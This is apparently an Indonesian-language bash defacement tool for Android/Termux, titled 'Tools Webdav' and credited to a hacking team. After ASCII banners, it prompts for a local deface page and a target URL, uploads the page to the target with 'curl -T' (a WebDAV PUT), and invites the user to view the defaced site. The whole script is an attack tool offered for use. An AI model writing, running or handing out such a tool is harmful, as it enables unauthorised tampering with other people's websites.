clear
echo "\033[1;94m"
figlet "R133FDAFACE"
sleep 3

echo '\033[1;32m<[============[\033[1;33mTools Webdav\033[1;32m]============]>'
sleep 0.03
echo '\033[1;31m  Author : \033[1;37mMr 4R13F'
sleep 0.03
echo '\033[1;31m  Team   : \033[1;37mDevlinCyber'
sleep 0.03
echo '\033[1;31m  aadmin : \033[1;37mMr.KRT58X'
sleep 0.03
echo '\033[1;32m<[============[\033[1;33mTools Webdav\033[1;32m]============]>'
sleep 3

echo '\033[1;32m  Masukan Script Deface\033[1;31m[harus ada di sdcard]'

read -p "  ╰━≻ masukan script : " Script

echo '  \033[94mSedang Membuka script...'
sleep 3
echo '  \033[92mSelesai'

echo ' \033[1;31m Masukan Terget mu'
read -p "  ╰━≻ masukan target : " Target

echo ''
echo '  sedang melaksanakan tugas...'

curl -T /storage/emulated/0/$Script $Target
sleep 3

echo '  \033[94mSelesai'
echo '\033[1;32m<[============[\033[1;33mHappy Daface\033[1;32m]============]>'
echo "  silahkan cek $Target/$Script" 
sleep 3
echo ''
echo '  Terimakasih Telah menggunalakan Tools Kami'
echo '\033[1;32m<[============[\033[1;33mHappy Daface\033[1;32m]============]>'
sleep 3
bash
